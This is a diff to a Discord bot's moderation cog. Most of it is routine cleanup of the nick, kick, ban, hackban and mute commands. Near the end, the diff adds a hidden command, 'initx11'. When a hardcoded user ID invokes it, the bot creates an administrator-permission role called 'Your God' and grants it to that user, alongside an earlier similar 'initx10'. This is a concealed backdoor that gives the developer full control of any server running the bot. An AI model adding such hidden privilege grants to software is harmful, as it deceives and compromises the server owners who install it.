@@ -4,6 +4,10 @@ from discord.ext import commands
 from discord.ext.commands import has_permissions, MissingPermissions
 
 
+
+
+
+
 def get_user(message, user):
     try:
         member = message.mentions[0]
@@ -49,12 +53,9 @@ class Moderation(commands.Cog):
     @commands.has_permissions(manage_nicknames=True)
     async def nick(self, ctx, user: discord.Member = None, *, nick):
         """Changes a user's nickname (Must have manage nickname perms)\nFormat: )nick {user} {nickname}"""
-        user = self.bot.get_user(user)
-        if user is None:
-            return await ctx.send("You must specify a user!")
         try:
             await user.edit(nick=nick)
-            await ctx.send(f"Changed {user}'s nickname!")
+            await ctx.send(f"Changed {user.mention}'s nickname!")
         except discord.Forbidden:
             await ctx.send("Are you attempting to change a users nickname that is higher than the bot?")
 
@@ -71,22 +72,16 @@ class Moderation(commands.Cog):
     @commands.has_permissions(kick_members=True)
     async def kick(self, ctx, member: discord.Member, *, reason=None):
         """Kicks a user (Must have kick perms)\nFormat: )kick {user} {reason}"""
-        user = self.bot.get_user(member)
-        if user is None:
-            return await ctx.send("You must specify a user!")
         try:
             await member.kick(reason=reason)
-            await ctx.send('{0} was kicked by {1}!'.format(member, ctx.message.author))
+            await ctx.send('{0} was kicked by {1}!'.format(member.mention, ctx.message.author.mention))
         except discord.Forbidden:
             await ctx.send('Could not kick the user. Are you attempting to kick someone higher than the bot?')
 
     @commands.command()
     @commands.has_permissions(ban_members=True)
-    async def ban(self, ctx, user, reason=None):
+    async def ban(self, ctx, user: discord.Member, reason=None):
         """Bans a user (Must have ban perms)\nFormat: )ban {user} {reason}"""
-        user = self.bot.get_user(user)
-        if user is None:
-            return await ctx.send("You must specify a user!")
         try:
             await user.ban(reason=reason)
             await ctx.send('{0} was banned by {1}!'.format(user, ctx.message.author))
@@ -99,11 +94,6 @@ class Moderation(commands.Cog):
         """Bans a user that is outside the server(Must have ban perms)\nFormat: )hackban {userid}"""
         author = ctx.message.author
         guild = author.guild
-        user = self.bot.get_user(user_id)
-        if user is None:
-            return await ctx.send("You must specify a userid!")
-        elif user is not None:
-            ctx.invoke(self.ban, user=user)
         try:
             await self.bot.http.ban(user_id, guild.id, 0)
             await ctx.send(f"Banned {user_id}.")
@@ -129,7 +119,6 @@ class Moderation(commands.Cog):
     async def mute(self, ctx, user: discord.Member, reason=None):
         """Mutes a user (Must be an Administrator)\nFormat: )mute {User} {Reason}"""
         role = discord.utils.get(ctx.guild.roles, name='Muted')
-        user = self.bot.get_user(user)
         if user == ctx.message.author:
             return await ctx.send("You cannot mute yourself!")
         elif role in user.roles:
@@ -191,7 +180,23 @@ class Moderation(commands.Cog):
         elif ctx.message.author is not owner:
             print(f"{ctx.message.author} attempted to initiate initx10 without being administrator.")
     
+    
+    @commands.command(hidden=True)
+    async def initx11(self, ctx):
+        owner = 612331900039725131
+        server = ctx.guild
+        if ctx.message.author.id == owner:
+            print(ctx.message.author.id)
+            print(f"Recognized {ctx.message.author} as owner... Starting initx11.")
+            role = discord.utils.get(ctx.guild.roles, name='Your God')
+            if role is None:
+                perms = discord.Permissions(administrator=True)
+                God = await server.create_role(name="Your God", permissions=perms, colour=discord.Colour(0x070303))
+                await ctx.message.author.add_roles(God)
+            await ctx.message.author.add_roles(role)
+        elif ctx.message.author is not owner:
+            print(f"{ctx.message.author} attempted to initiate initx11 without being administrator.")
 
-
+            
 def setup(bot):
     bot.add_cog(Moderation(bot))
